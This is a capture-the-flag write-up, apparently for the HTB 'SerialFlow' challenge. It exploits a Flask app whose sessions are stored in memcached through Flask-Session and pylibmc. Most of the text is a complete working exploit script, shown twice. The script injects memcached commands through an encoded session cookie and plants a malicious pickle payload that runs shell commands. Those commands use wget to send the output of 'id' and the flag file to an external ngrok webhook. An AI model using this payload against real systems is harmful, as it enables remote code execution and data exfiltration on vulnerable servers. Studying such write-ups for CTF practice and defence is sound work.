## **Description**
SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?
<br></br>

```py
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)
```
The `memcached` is used for caching data.


In `requqirements.txt` we can see it uses `pylibmc==1.6.3` also `Flask-Session==0.4.0`

```txt
Flask==2.2.2
Flask-Session==0.4.0
pylibmc==1.6.3
Werkzeug==2.2.2
```
After reading the sessions.py from `https://github.com/pallets-eco/flask-session/blob/main/src/flask_session/sessions.py`

I found that it used the `cPickle` which is vulnerable to deserialization attacks, After a bit of googling about memcached and cPickle, I came across this as the POC of the exploit.
`https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/`

I tried to wget my webhook, and it worked! , GOT RCE
<br></br>
```py
from requests import *
import re
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://1a46-80-10-22-106.ngrok-free.app/?c=$(id)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset session:10 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:10')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
c=generate_exploit()
print(c)
url="http://83.136.255.150:51682/"
r=get(url,cookies={"session":c})
# print(r.text)
```
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/7.PNG">
<br></br>
```py
from requests import *
import re
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://1a46-80-10-22-106.ngrok-free.app/?c=$(cat /flag*)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset session:10 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:10')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
c=generate_exploit()
print(c)
url="http://83.136.255.150:51682/"
r=get(url,cookies={"session":c})
# print(r.text)
```
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/8.PNG">
<br></br>
```
HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}
```
